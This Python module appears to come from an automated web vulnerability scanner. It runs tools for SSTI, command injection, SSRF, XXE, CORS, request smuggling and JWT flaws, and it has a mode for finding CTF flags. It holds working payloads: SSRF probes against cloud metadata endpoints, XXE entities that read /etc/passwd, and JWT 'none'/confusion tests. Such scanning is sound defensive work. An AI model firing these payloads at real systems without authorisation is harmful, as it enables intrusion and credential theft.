"""
Web vulnerability checks — step 6.4.
Covers: SSTI, Command Injection, SSRF, XXE, CORS, HTTP Smuggling, JWT attacks.
Tools: tplmap, commix, ssrfmap, XXEinjector, corsy, smuggler, jwt_tool.
Each check degrades gracefully if the tool is missing.
Only triggers on scan_type in ("web", "full").
"""
from __future__ import annotations

import json
import re
import tempfile
import os
from typing import TYPE_CHECKING

from app.scanner.base import Finding, ScanResult, run_cmd
from app.scanner.flag_extractor import build_flag_pattern, search_flags_decoded

if TYPE_CHECKING:
    from app.scanner.context import ScanContext


# ── helpers ───────────────────────────────────────────────────────────────────

_PARAM_URL_RE = re.compile(r"(https?://\S+\?\S+=)[^\s&]*", re.I)


def _collect_param_urls(all_findings: list[Finding], max_urls: int = 10) -> list[str]:
    seen: set[str] = set()
    urls: list[str] = []
    for f in all_findings:
        for src in [f.evidence or "", f.title or ""]:
            for m in _PARAM_URL_RE.finditer(src):
                u = m.group(0).rstrip(".")
                if u not in seen:
                    seen.add(u)
                    urls.append(u)
    return urls[:max_urls]


def _base_urls(target: str, nmap_findings: list[Finding]) -> list[str]:
    urls: list[str] = []
    seen: set[str] = set()
    for f in nmap_findings:
        if f.type == "port" and f.service in ("http", "https", "http-alt", "ssl/http"):
            scheme = "https" if (f.port or 0) in (443, 8443) else "http"
            port = f.port or (443 if scheme == "https" else 80)
            u = (f"{scheme}://{target}" if (scheme == "http" and port == 80) or
                 (scheme == "https" and port == 443) else f"{scheme}://{target}:{port}")
            if u not in seen:
                seen.add(u)
                urls.append(u)
    return urls or [f"http://{target}"]


# ── 1. SSTI via tplmap ────────────────────────────────────────────────────────

def _run_tplmap(url: str, timeout: int = 120) -> list[Finding]:
    rc, stdout, stderr = run_cmd(
        ["tplmap", "-u", url, "--level", "1", "--engine", "all"],
        timeout=timeout,
    )
    if rc == -1 or "command not found" in stderr:
        return []

    findings: list[Finding] = []
    engine_m = re.search(r"Template engine:\s*(\S+)", stdout, re.I)
    rce_m    = re.search(r"Remote Code Execution.*?(\w+)", stdout, re.I)
    engine   = engine_m.group(1) if engine_m else "unknown"

    if rce_m or re.search(r"is vulnerable|RCE", stdout, re.I):
        findings.append(Finding(
            type="ssti",
            title=f"SSTI → RCE via {engine}: {url[:80]}",
            severity="critical",
            description=(
                f"tplmap confirmed Server-Side Template Injection in {engine}.\n"
                f"URL: {url}\nRCE possible.\n\nOutput:\n{stdout[:500]}"
            ),
            cvss_score=9.8,
            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            evidence=stdout[:300],
            remediation=(
                "Never render user-controlled strings as templates. "
                "Use sandboxed template environments. "
                "Validate and escape all user input before passing to template engines."
            ),
        ))
    elif re.search(r"might be injectable|potential", stdout, re.I):
        findings.append(Finding(
            type="ssti",
            title=f"SSTI (potential): {url[:80]}",
            severity="high",
            description=f"tplmap found potential SSTI indicators.\nURL: {url}\n{stdout[:300]}",
            cvss_score=7.3,
            evidence=stdout[:200],
            remediation="Review template rendering code for user-controlled input.",
        ))
    return findings


# ── 2. Command Injection via commix ───────────────────────────────────────────

def _run_commix(url: str, timeout: int = 120) -> list[Finding]:
    rc, stdout, stderr = run_cmd(
        ["commix", "--url", url, "--batch", "--level", "1", "--output-dir",
         os.path.join(tempfile.gettempdir(), "commix_out")],
        timeout=timeout,
    )
    if rc == -1 or "command not found" in stderr:
        return []

    findings: list[Finding] = []
    if re.search(r"is vulnerable|command injection|backdoor|shell", stdout, re.I):
        param_m = re.search(r"parameter '(\w+)'", stdout, re.I)
        param   = param_m.group(1) if param_m else "unknown"
        findings.append(Finding(
            type="cmdi",
            title=f"Command Injection: param '{param}' — {url[:80]}",
            severity="critical",
            description=(
                f"commix confirmed OS command injection in parameter '{param}'.\n"
                f"URL: {url}\n\nOutput:\n{stdout[:500]}"
            ),
            cvss_score=9.8,
            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            evidence=stdout[:300],
            remediation=(
                "Never pass user input to system shell calls. "
                "Use language-native APIs instead of shell commands. "
                "Apply strict allowlist input validation."
            ),
        ))
    return findings


# ── 3. SSRF via ssrfmap ───────────────────────────────────────────────────────

_SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",     # AWS IMDS
    "http://metadata.google.internal/computeMetadata/v1/",  # GCP
    "http://169.254.169.254/metadata/v1/",          # Azure
    "http://127.0.0.1/",
    "http://localhost/",
    "http://[::1]/",
]


def _probe_ssrf(url: str, timeout: int = 10) -> list[Finding]:
    """Quick manual SSRF probe against metadata endpoints."""
    try:
        import httpx
    except ImportError:
        return []

    findings: list[Finding] = []
    param_m = re.search(r"[?&](\w+)=", url)
    if not param_m:
        return []
    param = param_m.group(1)

    for payload in _SSRF_PAYLOADS:
        test_url = re.sub(r"([?&]" + re.escape(param) + r"=)[^&]*", r"\g<1>" + payload, url)
        try:
            r = httpx.get(test_url, timeout=timeout, follow_redirects=False,
                          headers={"User-Agent": "Mozilla/5.0"})
            # Cloud metadata returns 200 with JSON/text body
            if r.status_code == 200 and len(r.text) > 20:
                if re.search(r"ami-id|instanceId|computeMetadata|subscriptionId", r.text, re.I):
                    findings.append(Finding(
                        type="ssrf",
                        title=f"SSRF → Cloud Metadata: param '{param}' — {url[:80]}",
                        severity="critical",
                        description=(
                            f"SSRF confirmed: parameter '{param}' fetched cloud metadata.\n"
                            f"URL: {test_url}\nResponse: {r.text[:300]}"
                        ),
                        cvss_score=9.1,
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
                        evidence=r.text[:300],
                        remediation=(
                            "Block outbound requests to 169.254.169.254 and metadata endpoints. "
                            "Use an allowlist for URL parameters. "
                            "Disable cloud IMDS or require IMDSv2 (AWS)."
                        ),
                    ))
                    break
        except Exception:
            continue
    return findings


def _run_ssrfmap(url: str, timeout: int = 90) -> list[Finding]:
    rc, stdout, stderr = run_cmd(
        ["python3", "/opt/tools/ssrfmap/ssrfmap.py", "-r", url, "-p", "all"],
        timeout=timeout,
    )
    if rc == -1 or "not found" in stderr.lower():
        return _probe_ssrf(url)

    findings: list[Finding] = []
    if re.search(r"Found SSRF|vulnerable", stdout, re.I):
        findings.append(Finding(
            type="ssrf",
            title=f"SSRF confirmed: {url[:80]}",
            severity="high",
            description=f"ssrfmap found SSRF vulnerability.\nURL: {url}\n{stdout[:400]}",
            cvss_score=8.6,
            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N",
            evidence=stdout[:200],
            remediation="Validate and restrict URL parameters. Block internal network access.",
        ))
    return findings or _probe_ssrf(url)


# ── 4. XXE ────────────────────────────────────────────────────────────────────

_XXE_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
]

_XXE_SUCCESS_RE = re.compile(r"root:.*:0:0:|for 16-bit app support|\[extensions\]", re.I)


def _probe_xxe(base_url: str) -> list[Finding]:
    try:
        import httpx
    except ImportError:
        return []

    findings: list[Finding] = []
    for payload in _XXE_PAYLOADS:
        try:
            r = httpx.post(
                base_url, content=payload, timeout=10,
                headers={"Content-Type": "application/xml", "User-Agent": "Mozilla/5.0"},
            )
            if _XXE_SUCCESS_RE.search(r.text):
                snippet = next(
                    (l.strip() for l in r.text.splitlines() if _XXE_SUCCESS_RE.search(l)),
                    r.text[:200],
                )
                findings.append(Finding(
                    type="xxe",
                    title=f"XXE — File Read: {base_url[:80]}",
                    severity="high",
                    description=(
                        f"XXE injection confirmed via POST to {base_url}.\n"
                        f"Payload read local file successfully.\nSnippet: {snippet}"
                    ),
                    cvss_score=7.5,
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
                    evidence=snippet[:200],
                    remediation=(
                        "Disable external entity processing in XML parsers "
                        "(set FEATURE_EXTERNAL_GENERAL_ENTITIES to false). "
                        "Use JSON instead of XML where possible."
                    ),
                ))
                break
        except Exception:
            continue
    return findings


# ── 5. CORS misconfiguration via corsy ────────────────────────────────────────

def _run_corsy(url: str, timeout: int = 60) -> list[Finding]:
    rc, stdout, stderr = run_cmd(
        ["python3", "-m", "corsy", "-u", url, "-q"],
        timeout=timeout,
    )
    if rc == -1 or "not found" in stderr.lower() or "No module" in stderr:
        return _probe_cors(url)

    findings: list[Finding] = []
    if re.search(r"vulnerable|misconfiguration|arbitrary origin", stdout, re.I):
        misconfig_m = re.search(r"Misconfiguration:\s*(.+)", stdout, re.I)
        misconfig   = misconfig_m.group(1).strip() if misconfig_m else "CORS misconfiguration"
        findings.append(Finding(
            type="cors",
            title=f"CORS misconfiguration: {url[:80]}",
            severity="medium",
            description=(
                f"corsy found CORS misconfiguration on {url}.\n"
                f"Issue: {misconfig}\n\nOutput:\n{stdout[:400]}"
            ),
            cvss_score=6.5,
            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N",
            evidence=stdout[:200],
            remediation=(
                "Set Access-Control-Allow-Origin to specific trusted origins only. "
                "Never reflect the Origin header value directly. "
                "Ensure credentials are not allowed with wildcard origins."
            ),
        ))
    return findings


def _probe_cors(url: str) -> list[Finding]:
    """Manual CORS probe: send evil Origin, check response header."""
    try:
        import httpx
        r = httpx.get(
            url, timeout=10,
            headers={"Origin": "https://evil.example.com", "User-Agent": "Mozilla/5.0"},
        )
        acao = r.headers.get("access-control-allow-origin", "")
        acac = r.headers.get("access-control-allow-credentials", "")

        if acao == "https://evil.example.com" or acao == "*":
            severity = "high" if (acac.lower() == "true" and acao != "*") else "medium"
            return [Finding(
                type="cors",
                title=f"CORS: arbitrary origin reflected — {url[:80]}",
                severity=severity,
                description=(
                    f"Server reflects arbitrary Origin in ACAO header.\n"
                    f"ACAO: {acao}\nACAC: {acac or 'not set'}\nURL: {url}"
                ),
                cvss_score=8.1 if severity == "high" else 6.5,
                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N",
                evidence=f"ACAO={acao} ACAC={acac}",
                remediation=(
                    "Allowlist specific trusted origins. "
                    "Never set Access-Control-Allow-Credentials: true with a reflected Origin."
                ),
            )]
    except Exception:
        pass
    return []


# ── 6. HTTP Request Smuggling via smuggler ────────────────────────────────────

def _run_smuggler(url: str, timeout: int = 90) -> list[Finding]:
    rc, stdout, stderr = run_cmd(
        ["python3", "/opt/tools/smuggler/smuggler.py", "-u", url, "--quiet"],
        timeout=timeout,
    )
    if rc == -1 or "not found" in stderr.lower():
        return []

    findings: list[Finding] = []
    if re.search(r"potentially vulnerable|CL\.TE|TE\.CL|TE\.TE", stdout, re.I):
        vuln_type = "CL.TE" if "CL.TE" in stdout else "TE.CL" if "TE.CL" in stdout else "TE.TE"
        findings.append(Finding(
            type="smuggling",
            title=f"HTTP Request Smuggling ({vuln_type}): {url[:80]}",
            severity="high",
            description=(
                f"smuggler detected HTTP request smuggling ({vuln_type}) on {url}.\n"
                f"This can lead to cache poisoning, credential hijacking, or WAF bypass.\n"
                f"Output:\n{stdout[:400]}"
            ),
            cvss_score=8.1,
            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N",
            evidence=stdout[:200],
            remediation=(
                "Ensure front-end and back-end servers agree on request boundary parsing. "
                "Disable back-end connection reuse where possible. "
                "Use HTTP/2 end-to-end if supported."
            ),
        ))
    return findings


# ── 7. JWT attacks via jwt_tool ───────────────────────────────────────────────

def _find_jwt_tokens(all_findings: list[Finding]) -> list[str]:
    """Extract JWT-looking strings from scan evidence."""
    jwt_re = re.compile(r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+")
    tokens: list[str] = []
    seen: set[str] = set()
    for f in all_findings:
        for src in [f.evidence or "", f.description or ""]:
            for m in jwt_re.finditer(src):
                t = m.group(0)
                if t not in seen:
                    seen.add(t)
                    tokens.append(t)
    return tokens[:5]


def _run_jwt_tool(token: str, url: str, timeout: int = 60) -> list[Finding]:
    findings: list[Finding] = []

    # Test 1: none algorithm attack
    rc1, stdout1, _ = run_cmd(
        ["python3", "/opt/tools/jwt_tool/jwt_tool.py", token, "-X", "a", "-np"],
        timeout=timeout,
    )
    if rc1 != -1 and re.search(r"PASSED|vulnerable|accepted", stdout1, re.I):
        findings.append(Finding(
            type="jwt",
            title=f"JWT 'none' algorithm attack accepted — {url[:60]}",
            severity="critical",
            description=(
                "Server accepted a JWT with 'none' algorithm — signature verification bypassed.\n"
                f"Token: {token[:60]}...\nURL: {url}"
            ),
            cvss_score=9.8,
            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            evidence=stdout1[:200],
            remediation=(
                "Explicitly reject 'none' algorithm in JWT validation. "
                "Use a strict allowlist of permitted algorithms."
            ),
        ))

    # Test 2: RS256 → HS256 confusion
    rc2, stdout2, _ = run_cmd(
        ["python3", "/opt/tools/jwt_tool/jwt_tool.py", token, "-X", "k", "-np"],
        timeout=timeout,
    )
    if rc2 != -1 and re.search(r"PASSED|vulnerable|accepted", stdout2, re.I):
        findings.append(Finding(
            type="jwt",
            title=f"JWT algorithm confusion (RS256→HS256) — {url[:60]}",
            severity="critical",
            description=(
                "Server accepted a JWT with RS256→HS256 algorithm confusion attack.\n"
                f"Token: {token[:60]}...\nURL: {url}"
            ),
            cvss_score=9.1,
            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
            evidence=stdout2[:200],
            remediation=(
                "Fix algorithm: explicitly specify and verify the expected algorithm. "
                "Never use the algorithm field from the token header for verification."
            ),
        ))

    return findings


# ── Main entry point ──────────────────────────────────────────────────────────

async def run_web_vulns(
    ctx: "ScanContext",
    target: str,
    scan_type: str,
    all_findings: list[Finding],
    nmap_findings: list[Finding],
) -> ScanResult:
    result = ScanResult()

    if scan_type not in ("web", "full", "ctf"):
        return result

    ctf_pattern = build_flag_pattern(getattr(ctx.scan, "ctf_flag_format", None)) if scan_type == "ctf" else None

    param_urls = _collect_param_urls(all_findings)
    base_urls_list = _base_urls(target, nmap_findings)

    await ctx.log("Web vulns (6.4): SSTI / CmdI / SSRF / XXE / CORS / Smuggling / JWT", module="web_vulns")

    # ── SSTI + Command Injection (per parametric URL) ─────────────────────
    for url in param_urls[:5]:
        await ctx.log(f"  SSTI+CmdI → {url[:80]}", module="web_vulns")
        result.findings.extend(_run_tplmap(url))
        result.findings.extend(_run_commix(url))

    # ── SSRF (per parametric URL) ─────────────────────────────────────────
    for url in param_urls[:8]:
        hits = _run_ssrfmap(url)
        if hits:
            await ctx.log(f"  SSRF found on {url[:80]}", level="warning", module="web_vulns")
        result.findings.extend(hits)

    # ── XXE (POST to base URLs) ───────────────────────────────────────────
    for url in base_urls_list[:3]:
        await ctx.log(f"  XXE → {url[:80]}", module="web_vulns")
        result.findings.extend(_probe_xxe(url))

    # ── CORS (base URLs) ──────────────────────────────────────────────────
    for url in base_urls_list[:5]:
        hits = _run_corsy(url)
        if hits:
            await ctx.log(f"  CORS issue on {url[:80]}", level="warning", module="web_vulns")
        result.findings.extend(hits)

    # ── HTTP Smuggling (base URLs) ────────────────────────────────────────
    for url in base_urls_list[:3]:
        await ctx.log(f"  HTTP Smuggling → {url[:80]}", module="web_vulns")
        result.findings.extend(_run_smuggler(url))

    # ── JWT attacks (if tokens found in previous findings) ────────────────
    jwt_tokens = _find_jwt_tokens(all_findings)
    if jwt_tokens:
        await ctx.log(f"  JWT: testing {len(jwt_tokens)} token(s)", module="web_vulns")
        for token in jwt_tokens:
            result.findings.extend(_run_jwt_tool(token, base_urls_list[0] if base_urls_list else target))
    else:
        await ctx.log("  JWT: no tokens found in scan evidence", level="info", module="web_vulns")

    # CTF: search for flags in all tool output evidence
    if ctf_pattern:
        all_evidence = " ".join((f.evidence or "") + " " + (f.description or "") for f in result.findings)
        for flag in search_flags_decoded(all_evidence, ctf_pattern):
            result.findings.append(Finding(
                type="flag",
                title=f"FLAG CAPTURED via web vuln: {flag}",
                severity="critical",
                description=f"Flag found in web vulnerability probe output.\nFlag: {flag}",
                evidence=f"flag={flag}",
                cvss_score=10.0,
            ))

    sev_counts = {"critical": 0, "high": 0, "medium": 0}
    for f in result.findings:
        if f.severity in sev_counts:
            sev_counts[f.severity] += 1

    await ctx.log(
        f"Web vulns complete: {len(result.findings)} finding(s) — "
        f"critical={sev_counts['critical']} high={sev_counts['high']} medium={sev_counts['medium']}",
        level="warning" if result.findings else "success",
        module="web_vulns",
    )
    return result
